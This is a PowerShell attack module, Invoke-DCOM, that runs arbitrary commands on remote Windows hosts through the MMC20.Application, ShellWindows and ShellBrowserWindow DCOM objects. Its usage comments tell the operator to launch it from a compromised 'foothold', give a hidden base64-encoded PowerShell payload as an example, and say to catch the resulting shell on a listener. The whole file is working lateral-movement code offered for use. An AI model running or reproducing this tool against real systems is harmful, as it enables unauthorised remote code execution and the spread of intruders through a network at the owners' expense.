# Invoke-DCOM.ps1 - DCOM lateral movement via COM objects over RPC/135
# Usage: Import-Module .\Invoke-DCOM.ps1
#        Invoke-DCOM -ComputerName <ip|host> -Method MMC20 -Command 'calc.exe'
#        Invoke-DCOM -ComputerName <ip|host> -Method ShellWindows -Command 'powershell -nop -w hidden -e <b64>'
# Run FROM an elevated PowerShell on a Windows foothold. Needs local admin on the target.
# Fire-and-forget: spawns the process on the target, no output returns - catch the shell on your listener.

function Invoke-DCOM {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string] $ComputerName,

        [Parameter(Mandatory = $false, Position = 1)]
        [ValidateSet('MMC20', 'ShellWindows', 'ShellBrowserWindow')]
        [string] $Method = 'MMC20',

        [Parameter(Mandatory = $false, Position = 2)]
        [string] $Command = 'calc.exe'
    )

    # CLSIDs for the ProgID-less objects
    $CLSIDs = @{
        'ShellWindows'       = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'
        'ShellBrowserWindow' = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
    }

    $obj = $null
    try {
        Write-Host "[*] Method   : $Method"   -ForegroundColor Cyan
        Write-Host "[*] Target   : $ComputerName" -ForegroundColor Cyan
        Write-Host "[*] Command  : $Command" -ForegroundColor Cyan

        switch ($Method) {

            'MMC20' {
                # MMC20.Application - command runs as a child of mmc.exe on the target
                Write-Host "[*] Instantiating MMC20.Application..." -ForegroundColor Cyan
                $com = [Type]::GetTypeFromProgID('MMC20.Application', $ComputerName)
                $obj = [System.Activator]::CreateInstance($com)
                Write-Host "[+] Remote object created. Invoking ExecuteShellCommand..." -ForegroundColor Green
                # params: Command, Directory, Parameters, WindowState
                $obj.Document.ActiveView.ExecuteShellCommand('cmd', $null, "/c $Command", '7')
            }

            'ShellWindows' {
                # Hosted inside an EXISTING explorer.exe - needs an open explorer window on target
                Write-Host "[*] Instantiating ShellWindows (needs an open explorer window on target)..." -ForegroundColor Cyan
                $com = [Type]::GetTypeFromCLSID($CLSIDs[$Method], $ComputerName)
                $obj = [System.Activator]::CreateInstance($com)
                $item = $obj.Item()
                if (-not $item) {
                    Write-Host "[!] ShellWindows returned nothing - no open explorer window on target. Try MMC20." -ForegroundColor Red
                    return
                }
                Write-Host "[+] Got explorer window object. Invoking ShellExecute..." -ForegroundColor Green
                $item.Document.Application.ShellExecute('cmd.exe', "/c $Command", 'C:\Windows\System32', $null, 0)
            }

            'ShellBrowserWindow' {
                # Hosted inside explorer.exe - no open window needed, but Win8+/2012+ only
                Write-Host "[*] Instantiating ShellBrowserWindow (Win8+/Server2012+ only)..." -ForegroundColor Cyan
                $com = [Type]::GetTypeFromCLSID($CLSIDs[$Method], $ComputerName)
                $obj = [System.Activator]::CreateInstance($com)
                Write-Host "[+] Remote object created. Invoking ShellExecute..." -ForegroundColor Green
                $obj.Document.Application.ShellExecute('cmd.exe', "/c $Command", 'C:\Windows\System32', $null, 0)
            }
        }

        Write-Host "[+] Command dispatched. Output does NOT return here - check your listener for the shell." -ForegroundColor Yellow
    }
    catch {
        Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[!] Common causes: not local admin on target, DCOM/135 filtered, or non-elevated PowerShell." -ForegroundColor Red
    }
    finally {
        if ($obj) {
            # Release the COM object so we don't leave a lingering process on the target
            try { [System.Runtime.InteropServices.Marshal]::ReleaseComObject($obj) | Out-Null } catch {}
            Write-Host "[*] COM object released." -ForegroundColor DarkGray
        }
    }
}
